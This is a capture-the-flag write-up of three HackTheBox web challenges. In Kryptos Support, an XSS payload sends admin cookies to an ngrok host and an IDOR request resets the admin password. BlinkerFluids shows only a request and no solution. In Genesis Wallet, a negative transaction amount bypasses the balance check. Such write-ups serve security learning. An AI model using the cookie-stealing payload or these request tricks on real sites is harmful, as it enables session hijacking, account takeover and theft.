# Kryptos Support - Web

This challenge we have this interface :

![image](https://user-images.githubusercontent.com/76447395/169404096-60e7e316-b5aa-4c47-bcd5-61462362eae7.png)

It says "AN ADMIN WILL REVIEW YOUR TICKET SHORTLY"... This is probably vulnerable agains XSS (Cross Site Scripting), let's test this out, let's try to make a request to our 
server :

```html
<img src=x onerror=this.src=" https://---------.ngrok.io/?"+document.cookie>
```

Now let's check our server :

```
[404]: GET /?session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTI5OTQ3MjB9._8UOKz7Q-h_B-76B17ncFPA3g9qTh4RMmy0H4qnZcW0 - 
No such file or directory
```

Nice! We have a `/login` : 

![image](https://user-images.githubusercontent.com/76447395/169405643-1f8584fe-21bf-4af6-9964-2eb730b26613.png)

Let's try to fuzz the site :

```
Target: http://138.68.188.223:31801/

[23:58:46] Starting:
[23:58:50] 302 -   23B  - /ADMIN  ->  /
[23:58:51] 302 -   23B  - /Admin  ->  /
[23:58:55] 302 -   23B  - /admin  ->  /
[23:58:55] 302 -   23B  - /admin/  ->  /
[23:58:55] 302 -   23B  - /admin/?/login  ->  /
[23:59:13] 200 -    2KB - /login/
[23:59:13] 302 -   23B  - /logout  ->  /
[23:59:13] 302 -   23B  - /logout/  ->  /
[23:59:14] 200 -    2KB - /login
[23:59:21] 500 -   35B  - /servlet/%C0%AE%C0%AE%C0%AF
[23:59:21] 302 -   23B  - /settings  ->  /
[23:59:21] 302 -   23B  - /settings/  ->  /
[23:59:23] 301 -  179B  - /static  ->  /static/

Task Completed
```

We can login in `/admin` :

![image](https://user-images.githubusercontent.com/76447395/169411855-62a587c6-84fe-4f22-a17e-aa373fcf158d.png)

In `Settings` we can change the password, but let's take a look at the request :

```
POST /api/users/update HTTP/1.1
Host: 138.68.188.223:31801
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
Accept: */*
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://138.68.188.223:31801/settings
Content-Type: application/json
Origin: http://138.68.188.223:31801
Content-Length: 31
Connection: close
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTI5OTc4MjJ9.f-LtSis6qZ9KFzsQnGQo93zlZBVKb1yugx7gafHIgg4

{"password":"test","uid":"100"}
```

We can change the `uid` to 1, and now try to login with `admin:test` :

![image](https://user-images.githubusercontent.com/76447395/169412607-fc7b410a-d3be-4601-bc9a-1012b38ea0b4.png)

> HTB{x55_4nd_id0rs_ar3_fun!!}

# BlinkerFluids - Web

In this site we can upload an image :

![image](https://user-images.githubusercontent.com/76447395/169414888-dc46234e-afdb-487b-bb8e-a93861b06e3d.png)

This is the request :

```
POST /api/alphafy HTTP/1.1
Host: 138.68.175.87:32678
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
Accept: */*
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://138.68.175.87:32678/
Content-Type: application/json
Origin: http://138.68.175.87:32678
Content-Length: 39
Connection: close

{"image":"","background":[255,255,255]}
```

# Genesis Wallet - Web

Genesis Wallet is a web application that manages crypto transactions :

<img width="1426" alt="image" src="https://user-images.githubusercontent.com/76447395/170642616-9d267a2c-25a1-4a95-b411-6b5a9e63cf3d.png">

In this challenge we must have more than 1337 GTC to get the flag. As we see in the source code we have a user with 1337 GTC : 

```sql
INSERT OR IGNORE INTO users (username, password, balance, otpkey, address)
				VALUES ('icarus', 'FlyHighToTheSky', 1337.10, '${uOTPKey}', '${uAddress}');
```

We can easily get the uAddress but if we want to log in as `icarus` we must have his `uOPTKey`... In this web application we can send, receive currency to another wallet, 
but how does the application check if we have enough currency? Source code is always the answer : 

```js
router.post('/api/transactions/verify', AuthMiddleware, async (req, res) => {
	const {trxid, otp} = req.body;
	if (trxLocked) return res.status(401).send(response('Please wait for the previous transaction to process first!'));

	return db.getUser(req.user.username)
		.then(async (user) => {
			db.getTransaction(trxid)
				.then(async (trx) => {
					if (parseFloat(user.balance) < parseFloat(trx.amount)) return res.status(403).send(response('Insufficient Funds!'));
          // [...]
```

If `user.balance` is smaller than `trx.amount` the transaction will be rejected, but the application is not expecting a negative `trx.amount`, let's try :)

<img width="1270" alt="image" src="https://user-images.githubusercontent.com/76447395/170644041-3d2465ab-816d-4ab6-b225-a5ad24107dba.png">

```json
POST /api/transactions/create HTTP/1.1

{"receiver":"098f6bcd4621d373cade4e832627b4f6","amount":"-1337","note":""}
```

Output : 

```json
{"message":"Transaction created successfully!"}
```

Nice, now the transaction must be verified AND then check the dashboard :

<img width="1274" alt="image" src="https://user-images.githubusercontent.com/76447395/170644926-02ac81c5-139e-452d-8a79-1fe9de705f8d.png">

Here we go!

> HTB{fl3w_t00_cl0s3_t0_th3_d3cept10n}
